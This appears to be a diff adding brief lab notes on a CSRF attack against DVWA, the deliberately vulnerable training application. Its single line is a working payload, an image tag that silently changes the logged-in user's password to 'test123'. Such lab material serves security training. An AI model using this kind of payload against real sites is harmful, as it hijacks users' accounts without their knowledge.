@@ -1,0 +1,3 @@
+CSRF ATTACK
+
+1. <img src="/dvwa/vulnerabilities/csrf/?password_new=test123&password_conf=test123&Change=Change">
